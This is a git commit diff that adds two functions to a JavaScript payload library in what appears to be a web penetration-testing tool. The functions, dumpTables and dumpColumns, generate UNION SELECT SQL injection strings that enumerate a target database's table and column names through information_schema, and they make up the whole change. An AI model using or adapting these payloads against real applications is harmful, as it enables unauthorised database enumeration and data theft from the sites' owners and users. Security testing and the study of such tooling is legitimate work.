04c80259bec1d7fc4fa99fa22179662d014af760
0140454 <s1994928@yahoo.com.tw>
2018-08-17 21:42:23 +0800

    Add SQLi payload for dumping tables/columns from database

--- scripts/payload.js
+++ scripts/payload.js
@@ -14,6 +14,28 @@ Payload.SQLi = class {
   static spaceToComment (value) {
     return value.replace(/[^\S\r\n]+/g, '/**/')
   }
+
+  static dumpTables (value) {
+    value = parseInt(value)
+    if (isNaN(value) === true) {
+      return ''
+    }
+
+    return 'union select group_concat(table_name)' + ((value > 1) ? ',' : '') +
+      Array.from(Array(value + 1).keys()).slice(2).join(',') +
+      ' from information_schema.tables where table_schema=database()'
+  }
+
+  static dumpColumns (value) {
+    value = parseInt(value)
+    if (isNaN(value) === true) {
+      return ''
+    }
+
+    return 'union select group_concat(column_name)' + ((value > 1) ? ',' : '') +
+      Array.from(Array(value + 1).keys()).slice(2).join(',') +
+      ' from information_schema.columns where table_schema=database()'
+  }
 }
 
 Payload.LFI = class {
